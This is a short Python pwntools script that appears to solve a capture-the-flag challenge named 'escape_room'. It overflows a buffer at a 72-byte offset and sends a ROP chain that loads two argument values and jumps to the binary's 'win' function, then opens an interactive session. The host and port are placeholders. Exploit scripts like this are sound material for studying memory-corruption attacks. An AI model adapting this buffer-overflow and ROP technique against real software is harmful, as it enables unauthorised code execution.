#!/usr/bin/env python3
from pwn import *

exe = ELF("./escape_room")
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

OFFSET_TO_RIP = 72

pop_rdi = 0x401287
pop_rsi = 0x401289
ret = 0x40101a


def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote(HOSTNAME, PORT)
    return r

def main():
    r = conn()

    payload = flat(
        b'A' * OFFSET_TO_RIP,
        p64(pop_rdi),
        p64(0xdeadbeef),
        p64(pop_rsi),
        p64(0xcafebabe),
        p64(ret),
        p64(exe.sym.win)
    )

    r.recvuntil(b"keys?\n")
    r.sendline(payload)

    r.interactive()


if __name__ == '__main__':
    main()
